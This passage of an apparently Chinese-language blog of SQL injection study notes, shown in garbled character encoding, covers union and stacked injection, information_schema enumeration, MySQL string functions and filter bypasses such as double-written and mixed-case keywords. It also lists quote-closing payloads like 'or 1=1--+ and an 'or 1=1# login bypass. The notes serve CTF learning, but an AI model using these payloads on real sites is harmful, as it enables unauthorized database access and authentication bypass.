<h5 id="3-å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#3-å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="3.å †å æ³¨å…¥çš„å±€é™æ€§"></a>3.å †å æ³¨å…¥çš„å±€é™æ€§</h5><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p>
<p><strong>ä¸‹é¢æˆ‘ä»¥ä¸€é“é¢˜ä¸ºä¾‹è§£æå †å æ³¨å…¥ï¼Œè¯¥é¢˜æ¥è‡ªäº<a href="../../../../2022/06/21/buuctf-wp"> buuctfçš„[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ </a></strong></p>
<h4 id="2-æ— åˆ—åæ³¨å…¥"><a href="#2-æ— åˆ—åæ³¨å…¥" class="headerlink" title="2.æ— åˆ—åæ³¨å…¥"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">æ— åˆ—åæ³¨å…¥</a></h4><p>ä¸Šé¢é“¾æ¥æ˜¯ä¸€ç¯‡å¤§ä½¬è®²è§£çš„æ— åˆ—åæ³¨å…¥ï¼Œä¹‹å‰åˆ·æ”»é˜²ä¸–ç•Œé‡åˆ°ç±»ä¼¼çš„é¢˜ç›®ï¼Œçœ‹äº†è¿™ç¯‡æ–‡ç« å­¦åˆ°äº†æ–°æŠ€å·§</p>
<h4 id="3-è”åˆæ³¨å…¥"><a href="#3-è”åˆæ³¨å…¥" class="headerlink" title="*3.è”åˆæ³¨å…¥"></a>*3.è”åˆæ³¨å…¥</h4><p><strong>è”åˆæ³¨å…¥æœ‰ä¸ªæŠ€å·§ã€‚åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ª è™šæ‹Ÿçš„æ•°æ®</strong></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š<br>æœ€åˆusersè¡¨ä¸­åªæœ‰ä¸€è¡Œæ•°æ®ï¼Œ</p>
<p><img src="/post/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p>
<p><strong>æˆ‘ä»¬é€šè¿‡<code>union select</code>æŸ¥è¯¢å°±å¯ä»¥æ„é€ ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ï¼Œ</strong></p>
<p><img src="/post/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨usersè¡¨ä¸­åˆ©ç”¨è”åˆæŸ¥è¯¢åˆ›å»ºäº†ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ã€‚</p>
<hr>
<h3 id="1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°"><a href="#1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°" class="headerlink" title="1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°"></a>1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°</h3><blockquote>
<p>1.<code>version()</code>â€”â€”MySQL ç‰ˆæœ¬ </p>
<p>2.<code>user()</code>â€”â€”æ•°æ®åº“ç”¨æˆ·å </p>
<p>3.<code>database()</code>â€”â€”æ•°æ®åº“å </p>
<p>4.<code>@@datadir</code>â€”â€”æ•°æ®åº“è·¯å¾„ </p>
<p>5.<code>@@version_compile_os</code>â€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p>
</blockquote>
<h3 id="2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"><a href="#2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥" class="headerlink" title="2.ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"></a>2.ä¸€èˆ¬ç”¨äºå°è¯•çš„<u>é—­åˆè¯­å¥</u></h3><p>Ps:&#96;&#96;â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ Url ç¼–ç åçš„#ä¸º%23ï¼Œâ€“å’Œ#ä¸ºæ³¨é‡Šç¬¦ï¼ŒæŠŠåé¢è¯­å¥æ³¨é‡Šæ‰ï¼Œä½¿å…¶æ— æ³•æ‰§è¡Œ&#96;</p>
<blockquote>
<p>æœ‰æ—¶ç”¨â€“+ï¼Œè€Œä¸ç”¨#çš„åŸå› æ˜¯ï¼Œhttpæ— æ³•è§£é‡Š#ï¼Œæ‰€ä»¥ç”¨â€“+æ¥ä»£æ›¿ï¼Œ<br>â€“+ä¸­èµ·åˆ°æ³¨é‡Šä½œç”¨å…¶å®æ˜¯â€“ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„â€“ä¼šå’Œåé¢çš„å†…å®¹è¿ä¸Šä»è€Œå¯¼è‡´sqlè¯­å¥å‡ºé”™ï¼Œæ‰€ä»¥æœ‰äº†+ä¼šè§£é‡Šä¸ºç©ºæ ¼ï¼Œä»è€Œé¿å…æŠ¥é”™<br>æ•…<br>â€“%20   &lt;&#x3D;&#x3D;&gt;   â€“+</p>
</blockquote>
<blockquote>
<p>or 1&#x3D;1â€“+</p>
<p>â€˜or 1&#x3D;1â€“+</p>
<p>â€œor 1&#x3D;1â€“+</p>
<p>)or 1&#x3D;1â€“+</p>
<p>â€˜)or 1&#x3D;1â€“+</p>
<p>â€œ) or 1&#x3D;1â€“+</p>
<p>â€œ))or 1&#x3D;1â€“+</p>
</blockquote>
<h3 id="3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"><a href="#3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘" class="headerlink" title="3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"></a>3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘</h3><p>æå‡ºä¸€ä¸ªé—®é¢˜ <code>Select * from users where id=1 and 1=1</code>;è¿™æ¡è¯­å¥ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€‰æ‹©å‡º id&#x3D;1 çš„å†…å®¹ï¼Œand 1&#x3D;1 åˆ°åº•èµ·ä½œç”¨äº†æ²¡æœ‰ï¼Ÿè¿™é‡Œå°±è¦æ¸…æ¥š sql è¯­å¥æ‰§è¡Œé¡ºåºäº†ã€‚ åŒæ—¶è¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨ä½¿ç”¨ä¸‡èƒ½å¯†ç çš„æ—¶å€™ä¼šç”¨åˆ°ã€‚</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥ç”¨ <code>â€™or 1=1#</code> ä½œä¸ºå¯†ç è¾“å…¥ã€‚åŸå› æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ </p>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªé€»è¾‘è¿ç®—ï¼Œå½“ä½¿ç”¨ä¸Šè¿°æ‰€è°“çš„ä¸‡èƒ½å¯†ç åï¼Œæ„æˆçš„ sql è¯­å¥ä¸ºï¼š </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;&#x27;</span>or <span class="attribute">1</span>=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>Explain:ä¸Šé¢çš„è¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œæˆ‘ä»¬åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹å°±ç™»å½•åˆ°äº† admin ç”¨æˆ·äº†ã€‚åŸ å›  æ˜¯ åœ¨ where å­ å¥ å ï¼Œ æˆ‘ ä»¬ å¯ ä»¥ çœ‹ åˆ° ä¸‰ ä¸ª æ¡ ä»¶ è¯­ å¥ <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>ã€‚ä¸‰ä¸ªæ¡ä»¶ç”¨ and å’Œ or è¿›è¡Œè¿æ¥ã€‚åœ¨ sql ä¸­ï¼Œæˆ‘ä»¬ <u><strong>and çš„è¿ç®—ä¼˜å…ˆçº§å¤§äº or çš„å…ƒç®—ä¼˜å…ˆçº§</strong></u>ã€‚å› æ­¤å¯ä»¥çœ‹åˆ° <u><strong>ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼ˆç”¨ a è¡¨ç¤ºï¼‰æ˜¯çœŸçš„ï¼Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆç”¨ b è¡¨ç¤ºï¼‰æ˜¯å‡çš„ï¼Œa and b &#x3D; false</strong></u>,ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬äºŒä¸ªæ¡ä»¶æ‰§è¡Œ and åæ˜¯å‡ï¼Œå†ä¸<u><strong>ç¬¬ä¸‰ ä¸ªæ¡ä»¶ or è¿ç®—ï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªæ¡ä»¶ 1&#x3D;1 æ˜¯æ’æˆç«‹çš„ï¼Œæ‰€ä»¥ç»“æœè‡ªç„¶å°±ä¸ºçœŸäº†</strong></u>ã€‚å› æ­¤ä¸Šè¿°çš„è¯­ å¥å°±æ˜¯æ’çœŸäº†</p>
<p>ps.<strong><code>é€»è¾‘è¯­å¥çš„åŒºåˆ«</code></strong></p>
<blockquote>
<p>1.and:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œæ‰ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p>
<p>2.or:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶æ»¡è¶³å…¶ä¸­ä¸€ä¸ªå³ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p>
<blockquote>
<p>ä½¿ç”¨andè¯­å¥æ³¨æ„<code>select * from test where a = 1 and a = 2</code>è¿™æ ·æ“ä½œè‚¯å®šä¸è¡Œï¼Œ<u><strong>åé¢çš„ä¸€ä¸ªå€¼ä¼šæŠŠå‰é¢çš„å€¼ç»™è¦†ç›–æ‰</strong></u>ï¼Œæœ€åæ‰§è¡Œçš„æ˜¯<code>select * from test where a = 2</code></p>
<p>è€Œç”¨orè¯­å¥çš„è¯<code>select * from test where a = 1 or a = 2</code>,æ‰§è¡Œ<code>select * from test where a = 1</code>,è‹¥<code>a=1</code>ä¸ºå‡ï¼Œåˆ™æ‰§è¡Œ<code>select * from test where a = 2</code></p>
</blockquote>
</blockquote>
<blockquote>
<p>3.union:è”åˆæŸ¥è¯¢ï¼Œå°†<u><strong>å¤šä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ï¼ˆå¦‚æœæœ‰ä¸€ä¸ªç»“æœä¸ºç©ºï¼Œä¸å½±å“å…¶ä»–ç»“æœåˆå¹¶ï¼‰</strong></u>èµ·æ¥æ—¶ï¼Œ<u><strong>ç³»ç»Ÿä¼šè‡ªåŠ¨å»æ‰é‡å¤å…ƒç»„</strong></u></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœid&#x3D;1ï¼Œé‚£ä¹ˆç»“æœåˆå¹¶æ—¶ï¼Œå°±ä¼šè¦†ç›–åé¢çš„ç»“æœï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‰é¢çš„è¯­å¥è¿”å›ä¸ºç©ºï¼Œé‚£ä¹ˆåé¢çš„æ•°æ®å°±ä¼šæ˜¾ç°å‡ºæ¥</p>
</blockquote>
<p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„ SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯æ¡ SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚ </p>
<h3 id="4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"><a href="#4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘" class="headerlink" title="4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"></a>4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘</h3><h4 id="ps-å…³é”®è®°å¿†å’Œä½¿ç”¨"><a href="#ps-å…³é”®è®°å¿†å’Œä½¿ç”¨" class="headerlink" title="ps.å…³é”®è®°å¿†å’Œä½¿ç”¨"></a>ps.å…³é”®è®°å¿†å’Œä½¿ç”¨</h4><blockquote>
<p>schema_name æ•°æ®åº“å</p>
<p><code>information_schema.schemata</code> å…¨éƒ¨æ•°æ®åº“</p>
<p><code>table_name</code> è¡¨å</p>
<p><code>information_schema.tables</code> å…¨éƒ¨è¡¨</p>
<p><code>table_schema=â€™xxxxxâ€™</code> â€˜xxxxâ€™ä¸ºç›®æ ‡è¡¨æ‰€åœ¨çš„æ•°æ®åº“å</p>
<p><code>column_name</code> åˆ—å</p>
<p><code>information_schema.columns</code> å…¨éƒ¨åˆ—å</p>
<p><code>table_name=â€™xxxxxâ€™</code> â€˜xxxxâ€™æƒ³è¦æŸ¥è¯¢æ•°æ®æ‰€åœ¨çš„è¡¨å</p>
</blockquote>
<h4 id="1-æ³¨å…¥è¯­å¥"><a href="#1-æ³¨å…¥è¯­å¥" class="headerlink" title="[1] æ³¨å…¥è¯­å¥"></a>[1] æ³¨å…¥è¯­å¥</h4><blockquote>
<p>1ï¼‰çŒœæ•°æ®åº“ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2ï¼‰çŒœæŸåº“çš„æ•°æ®è¡¨ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>select table_name from information_schema.tables where table_schema=â€™xxxxxâ€™</code> </p>
<p>3ï¼‰çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>select column_name from information_schema.columns where table_name=â€™xxxxxâ€™</code> </p>
<p>4ï¼‰è·å–æŸåˆ—çš„å†…å®¹ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥åˆ—ã€‘</p>
<p><code>select column_name  from  table_name</code></p>
</blockquote>
<h4 id="2-æ³¨å…¥æµç¨‹å›¾"><a href="#2-æ³¨å…¥æµç¨‹å›¾" class="headerlink" title="[2] æ³¨å…¥æµç¨‹å›¾"></a>[2] æ³¨å…¥æµç¨‹å›¾</h4><p><img src="/post/Web-study/image-20230803154919325.png" alt="image-20230803154919325"></p>
<h3 id="5-mysqlé”™è¯¯åˆ†æè§£å†³"><a href="#5-mysqlé”™è¯¯åˆ†æè§£å†³" class="headerlink" title="5.mysqlé”™è¯¯åˆ†æè§£å†³"></a>5.mysqlé”™è¯¯åˆ†æè§£å†³</h3><h4 id="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"><a href="#1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ" class="headerlink" title="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"></a>1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ</h4><p><code>Subquery returns more than 1 row</code></p>
<p>ä»¥<code>select * from table1 where table1.colums=(select columns from table2)</code>è¿™ä¸ªsqlè¯­å¥ä¸ºä¾‹</p>
<blockquote>
<p>1.å¦‚æœæ˜¯å†™å…¥é‡å¤ï¼Œå»æ‰é‡å¤æ•°æ®ã€‚ç„¶åå†™å…¥çš„æ—¶å€™ï¼Œå¯ä»¥åŠ é€»è¾‘åˆ¤æ–­(php)æˆ–è€…å¤–é”®(mysql)ï¼Œé˜²æ­¢æ•°æ®é‡å¤å†™å…¥ã€‚ï¼ˆä½†åœ¨å®é™…å¼€å‘ä¸­å¯èƒ½éœ€è¦é‡å¤å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦æ…é‡è€ƒè™‘ï¼‰</p>
<p>2.åœ¨å­æŸ¥è¯¢æ¡ä»¶è¯­å¥åŠ <code>limit 1</code>,æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å°±å¯ä»¥äº†<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>å¦‚æœéœ€è¦ç»§ç»­å‘åæŸ¥è¯¢ï¼Œå¯ä»¥ç”¨<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   â€¦..  <code>limit n,1</code></p>
<p>3.åœ¨å­æŸ¥è¯¢å‰åŠ anyå…³é”®å­—<br>&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)</p>
</blockquote>
<h4 id="ps-å­æŸ¥è¯¢è¯­å¥"><a href="#ps-å­æŸ¥è¯¢è¯­å¥" class="headerlink" title="ps. å­æŸ¥è¯¢è¯­å¥"></a>ps. å­æŸ¥è¯¢è¯­å¥</h4><p><strong>å­æŸ¥è¯¢</strong>æ˜¯æŒ‡åœ¨<strong>ä¸€ä¸ªselectè¯­å¥ä¸­åµŒå¥—å¦ä¸€ä¸ªslecetè¯­å¥</strong>ã€‚</p>
<p><strong>anyã€inã€someã€all</strong>åˆ†åˆ«æ˜¯å­æŸ¥è¯¢å…³é”®è¯ä¹‹ä¸€ã€‚</p>
<p><strong>any</strong>å¯ä»¥ä¸&#x3D;ã€&gt;ã€&gt;&#x3D;ã€&lt;ã€&lt;&#x3D;ã€&lt;&gt;ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæ•°æ®ã€‚</p>
<p>allå¯ä»¥ä¸&#x3D;ã€&gt;ã€&gt;&#x3D;ã€&lt;ã€&lt;&#x3D;ã€&lt;&gt;ç»“åˆæ˜¯æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„å…¶ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚</p>
<p>ä»–ä»¬è¿›è¡Œå­æŸ¥è¯¢çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
</blockquote>
<p><strong>any,allå…³é”®è¯å¿…é¡»ä¸ä¸€ä¸ªæ¯”è¾ƒæ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨</strong></p>
<p>anyå…³é”®è¯å¯ä»¥ç†è§£ä¸º<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>ä»»æ„</u>æ•°å€¼ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtureï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1 &gt; <span class="keyword">any</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> t2)</span><br></pre></td></tr></table></figure>

<p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ ï¼Œ t2åŒ…å«ï¼ˆ20,12,5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼›å¦‚æœt2åŒ…å«ï¼ˆ20,10ï¼‰ï¼Œæˆ–è€…è¡¨t2ä½ç©ºè¡¨ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseã€‚å¦‚æœt2åŒ…å«ï¼ˆnullï¼Œnullï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunkonwnã€‚</p>
<p>allå…³é”®è¯<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>æ‰€æœ‰å€¼</u>ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtrueï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1&gt; <span class="keyword">all</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> s2)</span><br></pre></td></tr></table></figure>

<p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ-5,0ï¼Œ+5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼Œå› ä¸º10æ¯”t2ä¸­çš„æŸ¥å‡ºçš„æ‰€æœ‰ä¸‰ä¸ªå€¼å¤§ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ12,6ï¼Œnullï¼Œ-100ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseï¼Œå› ä¸ºt2ä¸­æœ‰ä¸€ä¸ªå€¼12å¤§äº10ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ0ï¼Œnullï¼Œ1ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunknownã€‚å¦‚æœt2ä¸ºç©ºè¡¨ï¼Œåˆ™ç»“æœä¸ºtrueã€‚</p>
<p>not in æ˜¯ â€œ&lt;&gt;allâ€çš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>è¯­å¥in ä¸â€œ&#x3D;anyâ€æ˜¯ç›¸åŒçš„ã€‚<br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>è¯­å¥someæ˜¯anyçš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h3 id="6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°"><a href="#6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°" class="headerlink" title="6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°"></a>6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°</h3><blockquote>
<h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,â€¦)</p>
<p>è‹¥æœ‰ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œè¿”å›NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(â€˜é—´éš”ç¬¦å·â€™,str1,str2,â€¦)</p>
<p><strong>é—´éš”ç¬¦å·å¯ä»¥æ˜¯ç©ºæ ¼ï¼Œä¸èƒ½ä¸å†™ï¼Œå¦åˆ™è¿”å›ä¸ºç©º</strong></p>
<p>æ˜¾ç¤ºä¸ºstr1é—´éš”ç¬¦å·str2é—´éš”ç¬¦å·str3â€¦</p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] å­—æ®µå [ order by æ’åºå­—æ®µ asc&#x2F;desc ] [separator â€œåˆ†éš”ç¬¦â€])</p>
<p>å¤šè¡Œæ•°æ®åœ¨ä¸€è¡Œæ˜¾ç¤ºå‡½æ•°</p>
<p>æ ¹æ®group byæŒ‡å®šçš„åˆ—è¿›è¡Œæ’åºåˆ†ç»„ï¼Œå°†åŒä¸€ç»„æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ç”¨åˆ†éš”ç¬¦é—´éš”</p>
<h5 id="ps-ç»„åˆä½¿ç”¨"><a href="#ps-ç»„åˆä½¿ç”¨" class="headerlink" title="ps. ç»„åˆä½¿ç”¨"></a>ps. ç»„åˆä½¿ç”¨</h5><p>å¦‚æœæ˜¯å¤šå­—æ®µç»„åˆ æ˜¾ç¤ºåœ¨ä¸€è¡Œçš„egï¼š</p>
<p>group_concat(concat_ws(â€˜,â€™,concat(str1ï¼Œstr2) ) )ï¼›</p>
<p>ä¸€ä¸ªå­—æ®µçš„è¯egï¼š</p>
<p>group_concat(concat_ws(â€˜,â€™,str1ï¼Œstr2) )ï¼› </p>
</blockquote>
<h3 id="7-è¿‡æ»¤æ›¿æ¢"><a href="#7-è¿‡æ»¤æ›¿æ¢" class="headerlink" title="*7.è¿‡æ»¤æ›¿æ¢"></a>*7.è¿‡æ»¤æ›¿æ¢</h3><h4 id="1ï¼‰åŒå†™ç»•è¿‡"><a href="#1ï¼‰åŒå†™ç»•è¿‡" class="headerlink" title="1ï¼‰åŒå†™ç»•è¿‡"></a>1ï¼‰åŒå†™ç»•è¿‡</h4><blockquote>
<p>(ç”¨äºæŠŠé»‘åå•çš„å­—ç¬¦æ›¿æ¢æˆç©º)ï¼šse<u>select</u>lect,un<u>union</u>ionï¼Œoorrç­‰ç­‰ï¼ˆæ›¿æ¢ä¸ºç©ºåï¼Œå‰©ä½™è¯­å¥å°±æ˜¯æ ‡å‡†çš„sqlè¯­å¥ï¼Œä¸ä¼šå½±å“è¯­å¥çš„æ­£å¸¸æ‰§è¡Œï¼‰</p>
<p>ps.æ³¨æ„ï¼Œæœ‰çš„è¯­å¥å‘½ä»¤å¯èƒ½ä¼šå¸¦æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œä¹Ÿéœ€è¦åŒå†™ï¼Œå¦‚<u>or</u>der,inf<u>or</u>mation.schema_schemataç­‰ï¼Œå½“ç½‘ç«™åœ¨æ£€æŸ¥æ—¶ï¼ŒåŒæ ·ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦å†™æˆo<u>or</u>rder,info<u>or</u>rmation.schema_schemataç­‰ç­‰</p>
</blockquote>
<h4 id="2ï¼‰å¤§å°å†™æ··åˆ"><a href="#2ï¼‰å¤§å°å†™æ··åˆ" class="headerlink" title="2ï¼‰å¤§å°å†™æ··åˆ"></a>2ï¼‰å¤§å°å†™æ··åˆ</h4><blockquote>
<p>(ç”¨äºé»‘åå•ä¸­åªæœ‰å°å†™æˆ–å¤§å†™ï¼Œå¹¶æ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡ŒåŒºåˆ†)</p>
<p>å¦‚sEleCt,unIoNç­‰ç­‰</p>
</blockquote>
<h4 id="3ï¼‰æ›¿æ¢"><a href="#3ï¼‰æ›¿æ¢" class="headerlink" title="*3ï¼‰æ›¿æ¢"></a>*3ï¼‰æ›¿æ¢</h4><blockquote>
<p>selectï¼š</p>
<p>unionï¼š</p>
